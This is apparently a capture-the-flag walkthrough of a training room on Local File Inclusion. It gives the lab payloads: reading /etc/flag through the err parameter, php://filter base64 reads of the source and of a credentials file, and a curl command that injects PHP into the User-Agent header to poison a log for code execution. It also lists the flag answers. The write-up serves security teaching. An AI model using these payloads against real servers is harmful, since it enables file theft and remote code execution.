# [Day 6] Web Exploitation - Patch Management Is Hard

## Learning Objectives

1. What is an Local File Inclusion (LFI) vulnerability?
2. How to indentify an LFI vulnerability?
3. How to test for an LFI vulnerability?

## Deploy the attached VM and look around. What is the entry point for our web application?

We open firefox and go to our machine URL: http://MACHINE-IP.p.thmlabs.com \
We notice that we are redirected to the following URL: http://MACHINE-IP.p.thmlabs.com/index.php?err=error.txt

Answer:
```
err
```

## Use the entry point to perform `LFI` to read the `/etc/flag` file. What is the flag?

We are at the following URL: http://MACHINE-IP.p.thmlabs.com/index.php?err=error.txt \
We change the file in `err` for: /etc/flag to retrieve the flag

Answer:
```
THM{d29e08941cf7fe41df55f1a7da6c4c06}
```

## Use the PHP filter technique to read the source code of the `index.php`. What is the `$flag` variable's value?

We are at the following URL: http://MACHINE-IP.p.thmlabs.com/index.php?err=error.txt \
We change the file in `err` for: php://filter/convert.base64-encode/resource=index.php to retrieve the base64 encoded file \
We can go to [CyberChef](https://gchq.github.io/CyberChef/) to decode the string and obtain the following:
```php
<?php session_start();
$flag = "THM{791d43d46018a0d89361dbf60d5d9eb8}";
include("./includes/creds.php");
if($_SESSION['username'] === $USER){                        
	header( 'Location: manage.php' );
	die();
} else {
	$labNum = "";
  require "./includes/header.php";
?>
<div class="row">
  <div class="col-lg-12">
  </div>
  <div class="col-lg-8 col-offset-1">
      <?php if (isset($error)) { ?>
          <span class="text text-danger"><b><?php echo $error; ?></b></span>
      <?php }

?>
 <p>Welcome <?php echo getUserName(); ?></p>
	<div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
	</div>
<?php if($errInclude){ include($_GET['err']);} ?>
</div>

<?php
}
?>
```

Answer:
```
THM{791d43d46018a0d89361dbf60d5d9eb8}
```

## There is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?

We are at the following URL: http://MACHINE-IP.p.thmlabs.com/index.php?err=error.txt \
We change the file in `err` for: php://filter/convert.base64-encode/resource=./includes/creds.php to retrieve the base64 encoded file \
We can go to [CyberChef](https://gchq.github.io/CyberChef/) to decode the string and obtain the following:
```php
<?php 
$USER = "McSkidy";
$PASS = "A0C315Aw3s0m";
?>
```

Answer:
```
McSkidy:A0C315Aw3s0m
```

## Use the credentials to login into the web application. Help McSkidy to recover the server's password. What is the password of the flag.thm.aoc server?

We log in using `username`: McSkidy and `password`: A0C315Aw3s0m to retrieve the flag in the "password recovery" page

Answer:
```
THM{552f313b52e3c3dbf5257d8c6db7f6f1}
```

## The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.

We use curl to inject PHP code in the `User-Agent`:
```bash
curl -A "<?php phpinfo();?>" http://MACHINE-IP.p.thmlabs.com/  
```

We can analyze the PHP info and retrieve the webserver name

Answer:
```
lfi-aoc-awesome-59aedca683fff9261263bb084880c965
```